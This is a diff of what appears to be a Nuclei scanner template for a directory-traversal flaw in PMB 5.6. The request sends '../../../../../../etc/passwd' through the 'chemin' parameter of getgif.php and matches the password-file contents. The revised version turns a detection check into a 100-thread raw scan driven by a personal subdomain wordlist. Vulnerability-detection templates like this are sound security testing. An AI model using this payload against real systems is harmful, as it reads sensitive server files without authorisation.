@@ -1,35 +1,31 @@
-id: pmb-directory-traversal
-
+id: pmb-directory-traversal 2
 info:
-  name: PMB 5.6 - Local File Inclusion
   author: geeknik
-  severity: high
-  description: PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.
-  reference:
-    - https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: lfi,packetstorm
-  metadata:
-    max-request: 2
+  description: The PMB Gif Image is not sanitizing the 'chemin', which leads to Local
+    File Disclosure.
+  name: PMB 5.6 Directory Traversal
+  reference: https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
+  severity: medium
+  tags: lfi
+requests:
+- attack: sniper
+  matchers:
+  - regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
+    HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
-      - "{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
+    Host: {{Subdomains}}
 
-    stop-at-first-match: true
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
-      - type: status
-        status:
-          - 200
-
-# Enhanced by mp on 2022/08/04
+    '
+  threads: 100
